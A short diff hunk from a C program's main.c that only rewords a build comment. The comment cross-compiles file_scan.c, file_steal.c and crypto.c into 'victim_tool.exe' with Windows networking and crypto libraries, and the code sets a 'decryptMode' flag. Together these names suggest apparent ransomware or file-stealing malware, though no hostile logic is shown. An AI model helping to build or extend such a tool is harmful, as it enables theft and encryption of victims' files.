@@ -4,7 +4,7 @@
 #include "file_scan.h"
 
 int main(int argc, char *argv[]) {
-// compile w x86_64-w64-mingw32-gcc main.c file_scan.c file_steal.c crypto.c -o victim_tool.exe -lwininet -ladvapi32 -lcrypt32 -lws2_32 
+// compile: x86_64-w64-mingw32-gcc main.c file_scan.c file_steal.c crypto.c -o victim_tool.exe -lwininet -ladvapi32 -lcrypt32 -lws2_32 
     bool decryptMode = false;
 
     if (argc > 1) {
